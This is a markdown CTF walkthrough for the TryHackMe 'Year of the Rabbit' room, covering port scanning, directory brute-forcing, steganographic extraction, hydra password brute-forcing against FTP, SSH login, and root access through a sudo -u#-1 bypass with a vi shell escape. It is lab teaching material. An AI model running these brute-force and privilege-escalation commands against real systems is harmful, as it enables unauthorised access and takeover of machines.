# Year of The Rabbit
    ~ https://tryhackme.com/room/yearoftherabbit

* ### This is a direct walk-through to the flag. Hopping that you have given your best before referring to this write-up
* ### Assuming that your are using Attack-box or conntected to VPN. If not, do refer to [vpn_connection](https://github.com/shybu9/TRY-HACK-ME/tree/main/OPEN-VPN-CONNECTION "OPEN VPN CONNECTION")
*  ### Do follow this page through out the line to void confusion.

<br>

 ![rabbit intro](https://user-images.githubusercontent.com/112984045/200450627-fcc3ffa8-4e3c-4bde-9530-2cdb6acfbf7b.png)
~ the IP will be given once you join the room and Start Machine succefully after connecting to OPEN-VPN
 
 ## ENUMERATION :

 * For ENUMERATION we use nmap tool which comes by default in kali linux.
 <br>command : 
 ```bash
 nmap -sVC -T4 -v <IP> 
 ```
 ![rabbit nmap](https://user-images.githubusercontent.com/112984045/200450896-f5d9f661-a182-4d23-a6bd-ac86ea7ebce7.png)
 <br>~ we can add -v argument for more verbose output.
 
 * I usually perform one more scan by using my personal tool : [port-scanner](https://github.com/shybu9/port-Scanner)
![rabbit portscanner](https://user-images.githubusercontent.com/112984045/200451032-97c2aa8e-2ace-4a73-8c87-d8280bfd5bee.png)<br>
 ~ I prefer this tool because of its speed as you can see it just took 858 seconds for scanning 65535 ports.Even still some improvements to be done
 
 ### ANALYSING BOTH SCANS :
 * number of OPEN PORTS : 3
 * PORT NUMBERS : 21,22,80
 * OPERATING SYSTEM : Uinux, Linux
 * service running on PORT 21 : ftp
 * service running on PORT 22 : ssh
 * service running on PORT 80 : http
 
 * As the port 80 is open lets have a look on web pages using IP
 ```bash
 http://<IP>
 ```
 
 <br>
 
 ```bash
 gobuster dir -u http://10.10.118.215/ --no-error -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o commongobu.txt
 ```
 ![rabbit gobuster](https://user-images.githubusercontent.com/112984045/200460412-5d6f4312-86ab-4372-805f-7875f79515a0.png)
 <br>
 
 ```bash
 http://<IP>/assets/
 ```
 ![rabbit assets](https://user-images.githubusercontent.com/112984045/200452670-15edf2c8-84b6-4285-8e6b-897f3983ab95.png)
 <br>
 
```bash
http://<IP>/assets/style.css
```
![rabbit assets css](https://user-images.githubusercontent.com/112984045/200698012-0eaba1c0-3685-4bab-80dc-45f8d3b7c629.png)
<br>

```bash
http://<IP>/< directory name in style.css >
```
` use the burp.. to check the response.`
![rabbit burp](https://user-images.githubusercontent.com/112984045/200702406-47239f73-313c-4ad4-8b47-85ee21b0b63d.png)
<br>

```bash
http://<ip>/< hidden directory name found in burp response >
```
![rabbit wexy](https://user-images.githubusercontent.com/112984045/200703653-2c5b4901-690a-4074-8aaa-bf80b340d397.png)
<br>

` copy the hot_bae image link and use the command :`
```bash
wget < link of image >
```
![rabbit wget](https://user-images.githubusercontent.com/112984045/200704376-4cd96a1f-c1cc-4678-ab41-28fe2391697d.png)
<br>

```bash
binwalk Hot_Babe.png 
```
```bash
sudo binwalk -e Hot_Babe.png --run-as=root
```
![rabbit binwalk](https://user-images.githubusercontent.com/112984045/200704812-9f351144-17c9-4001-acee-49013321a323.png)
<br>

```bash
cd _Hot_Babe.png.extracted
```
<br>

` use external web to extract the files in 36.zlib`[web](https://filext.com/file-extension/ZLIB)
![rabbit zlib extract](https://user-images.githubusercontent.com/112984045/200705317-7736006e-7870-40b1-b56b-9e52983bdabf.png)
<br>

```bash
hydra -l < username extracted > -P < list of passwords extracted > ftp://<IP>
```
` don't forget remove spaces from the password list`
![rabbit hydra ftp](https://user-images.githubusercontent.com/112984045/200705605-f4b8f8c1-ae57-4ce1-89cf-87aa30af85b5.png)
<br>

```bash
ftp <IP>
```
![rabbit ftplogin](https://user-images.githubusercontent.com/112984045/200706000-512cd4b9-0773-46c3-b4bc-93dd6b340b72.png)
<br>

```bash
get Eli's_Creds.txt
```
<br>

` terminate the ftp connection using ctrl+d `

` the code in Eli's_Creds.txt was a brainfuck programming language which is really good at its name `
* use [web](https://www.tutorialspoint.com/execute_brainfk_online.php) to execute the program.

![rabbit brainfuck](https://user-images.githubusercontent.com/112984045/200707694-ce3ff23b-2b5a-42f1-9292-81eea695481c.png)
<br>

```bash
ssh <username from brainfuck execution>@<IP>
```
![rabbit ssh login](https://user-images.githubusercontent.com/112984045/200711363-8062ba83-b659-4c0c-92b5-3f1302550815.png)
<br>

` look at the msg given to gwendoline from root. His is talking about a file 's3cr3t'.` <br>
` move to home directory and search for s3cr3t`
```bash
locate s3cr3t
```
![rabbit ssh secret](https://user-images.githubusercontent.com/112984045/200848335-8d3529c5-945b-4c0a-80b1-54a491112433.png)
<br>

```bash
su gwendoline
```
`look for user.txt and submit the flag`
![rabbit usrflag](https://user-images.githubusercontent.com/112984045/200849217-99aec744-f0a5-4196-b468-af46f3fe5bb8.png)
<br>

## PRIVILEGE ESCALATION

```bash
sudo -l
```
* the user gwendoline has rights to execute vi command but not as root.
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
* use the command `:!/bin/bash` in the editor.
![rabbit root](https://user-images.githubusercontent.com/112984045/200851195-4b9b99f2-97a8-4558-ac5d-c84d3ad346de.png)

### ` do submit the flag to complete the task`

<br>

### FOR ANY DOUBTS OR SUGGESTIONS DO WRITE TO shy.bu9@gmail.com
